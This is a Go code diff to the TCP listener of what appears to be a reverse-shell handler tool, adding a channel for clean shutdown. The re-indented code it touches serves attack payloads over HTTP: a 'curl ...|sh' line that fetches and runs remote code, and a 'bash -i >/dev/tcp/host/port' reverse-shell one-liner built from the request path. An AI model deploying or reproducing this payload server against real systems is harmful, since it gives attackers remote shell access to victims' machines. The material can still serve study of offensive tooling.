@@ -18,6 +18,7 @@ type TCPServer struct {
 	Port      int16
 	Clients   map[string](*TCPClient)
 	TimeStamp time.Time
+	Stopped   chan struct{}
 }
 
 func CreateTCPServer(host string, port int16) *TCPServer {
@@ -26,6 +27,7 @@ func CreateTCPServer(host string, port int16) *TCPServer {
 		Port:      port,
 		Clients:   make(map[string](*TCPClient)),
 		TimeStamp: time.Now(),
+		Stopped:   make(chan struct{}, 1),
 	}
 }
 
@@ -75,90 +77,96 @@ func (s *TCPServer) Run() {
 	log.Info(fmt.Sprintf("Server running at: %s", s.FullDesc()))
 
 	for {
-		conn, err := listener.Accept()
-		if err != nil {
-			continue
-		}
-		client := CreateTCPClient(conn)
-		// Reverse shell as a service
-		buffer := make([]byte, 4)
-		client.Conn.SetReadDeadline(time.Now().Add(time.Second * 3))
-		client.ReadLock.Lock()
-		n, err := client.Conn.Read(buffer)
-		client.ReadLock.Unlock()
-		client.Conn.SetReadDeadline(time.Time{})
-		if err != nil {
-			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
-				log.Error("Not requesting for service")
-			} else {
-				client.Interactive = false
-				Ctx.DeleteTCPClient(client)
+		select {
+		case <-s.Stopped:
+			listener.Close()
+			return
+		default:
+			conn, err := listener.Accept()
+			if err != nil {
+				continue
 			}
-		}
-		if string(buffer[:n]) == "GET " {
-			requestURI := client.ReadUntilClean(" ")
-			// Read HTTP Version
-			client.ReadUntilClean("\r\n")
-			httpHost := fmt.Sprintf("%s:%d", s.Host, s.Port)
-			for {
-				var line = client.ReadUntilClean("\r\n")
-				// End of headers
-				if line == "" {
-					log.Debug("All header read")
-					break
-				}
-				delimiter := ":"
-				index := strings.Index(line, delimiter)
-				headerKey := line[:index]
-				headerValue := LeftStrip(line[index+len(delimiter):])
-				if headerKey == "Host" {
-					httpHost = headerValue
-				}
-			}
-			var command string = fmt.Sprintf(
-				"curl http://%s/%s/%d|sh\n",
-				httpHost,
-				GetHostname(httpHost),
-				GetPort(httpHost, s.Port),
-			)
-			target := strings.Split(requestURI, "/")
-			if strings.HasPrefix(requestURI, "/") && len(target) == 3 {
-				host := target[1]
-				port, err := strconv.Atoi(target[2])
-				if err == nil {
-					command = fmt.Sprintf("bash -c 'bash -i >/dev/tcp/%s/%d 0>&1'\n", host, port)
+			client := CreateTCPClient(conn)
+			// Reverse shell as a service
+			buffer := make([]byte, 4)
+			client.Conn.SetReadDeadline(time.Now().Add(time.Second * 3))
+			client.ReadLock.Lock()
+			n, err := client.Conn.Read(buffer)
+			client.ReadLock.Unlock()
+			client.Conn.SetReadDeadline(time.Time{})
+			if err != nil {
+				if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
+					log.Error("Not requesting for service")
 				} else {
-					log.Debug("Invalid port number: %s", target[2])
+					client.Interactive = false
+					Ctx.DeleteTCPClient(client)
 				}
-			} else {
-				log.Debug("Invalid HTTP Request-Line: %s", buffer[:n])
 			}
-			client.Write([]byte("HTTP/1.0 200 OK\r\n"))
-			client.Write([]byte(fmt.Sprintf("Content-Length: %d\r\n", len(command))))
-			client.Write([]byte("\r\n"))
-			client.Write([]byte(command))
-			Ctx.DeleteTCPClient(client)
-			log.Info("RaaS: %s", command)
-		} else {
-			switch Ctx.BlockSameIP {
-			case 1:
-				newclientIP := client.Conn.RemoteAddr().String()
-				newclientIP = strings.Split(newclientIP, ":")[0]
-				clientExist := 0
-				for _, client := range s.Clients {
-					clientIP := client.Conn.RemoteAddr().String()
-					clientIP = strings.Split(clientIP, ":")[0]
-					if newclientIP == clientIP {
-						clientExist = 1
+			if string(buffer[:n]) == "GET " {
+				requestURI := client.ReadUntilClean(" ")
+				// Read HTTP Version
+				client.ReadUntilClean("\r\n")
+				httpHost := fmt.Sprintf("%s:%d", s.Host, s.Port)
+				for {
+					var line = client.ReadUntilClean("\r\n")
+					// End of headers
+					if line == "" {
+						log.Debug("All header read")
+						break
+					}
+					delimiter := ":"
+					index := strings.Index(line, delimiter)
+					headerKey := line[:index]
+					headerValue := LeftStrip(line[index+len(delimiter):])
+					if headerKey == "Host" {
+						httpHost = headerValue
 					}
 				}
-				if clientExist == 0 {
+				var command string = fmt.Sprintf(
+					"curl http://%s/%s/%d|sh\n",
+					httpHost,
+					GetHostname(httpHost),
+					GetPort(httpHost, s.Port),
+				)
+				target := strings.Split(requestURI, "/")
+				if strings.HasPrefix(requestURI, "/") && len(target) == 3 {
+					host := target[1]
+					port, err := strconv.Atoi(target[2])
+					if err == nil {
+						command = fmt.Sprintf("bash -c 'bash -i >/dev/tcp/%s/%d 0>&1'\n", host, port)
+					} else {
+						log.Debug("Invalid port number: %s", target[2])
+					}
+				} else {
+					log.Debug("Invalid HTTP Request-Line: %s", buffer[:n])
+				}
+				client.Write([]byte("HTTP/1.0 200 OK\r\n"))
+				client.Write([]byte(fmt.Sprintf("Content-Length: %d\r\n", len(command))))
+				client.Write([]byte("\r\n"))
+				client.Write([]byte(command))
+				Ctx.DeleteTCPClient(client)
+				log.Info("RaaS: %s", command)
+			} else {
+				switch Ctx.BlockSameIP {
+				case 1:
+					newclientIP := client.Conn.RemoteAddr().String()
+					newclientIP = strings.Split(newclientIP, ":")[0]
+					clientExist := 0
+					for _, client := range s.Clients {
+						clientIP := client.Conn.RemoteAddr().String()
+						clientIP = strings.Split(clientIP, ":")[0]
+						if newclientIP == clientIP {
+							clientExist = 1
+						}
+					}
+					if clientExist == 0 {
+						log.Info("New client %s Connected", client.Desc())
+						s.AddTCPClient(client)
+					}
+				case 0:
 					log.Info("New client %s Connected", client.Desc())
 					s.AddTCPClient(client)
 				}
-			case 0:
-				log.Info("New client %s Connected", client.Desc())
-				s.AddTCPClient(client)
 			}
 		}
 	}
@@ -202,6 +210,16 @@ func (s *TCPServer) FullDesc() string {
 
 func (s *TCPServer) Stop() {
 	log.Info(fmt.Sprintf("Stopping server: %s", s.OnelineDesc()))
+	s.Stopped <- struct{}{}
+
+	// Connect to the listener, in order to call listener.Close() immediately
+	go func() {
+		tmp, _ := net.Dial("tcp", fmt.Sprintf("%s:%d", s.Host, s.Port))
+		if tmp != nil {
+			tmp.Close()
+		}
+	}()
+
 	for _, client := range s.Clients {
 		s.DeleteTCPClient(client)
 	}
